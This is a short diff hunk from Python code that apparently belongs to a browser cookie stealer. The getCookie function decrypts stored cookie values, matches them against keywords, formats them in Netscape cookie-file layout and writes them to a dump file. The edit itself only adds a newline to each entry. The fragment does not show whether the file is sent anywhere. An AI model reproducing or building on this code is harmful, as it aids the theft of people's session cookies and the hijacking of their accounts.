@@ -546,7 +546,7 @@ def getCookie(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
-            Cookies.append(f"${row[0]}  TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2])}")
+            Cookies.append(f"${row[0]}  TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2])}\n")
             # Cookies.append(f"{row[0]}   TRUE    /   FALSE   2597573456  {row[1]}    {DecryptValue(row[2], master_key)}")
             CookiCount += 1
     writeforfile(Cookies, 'cook')
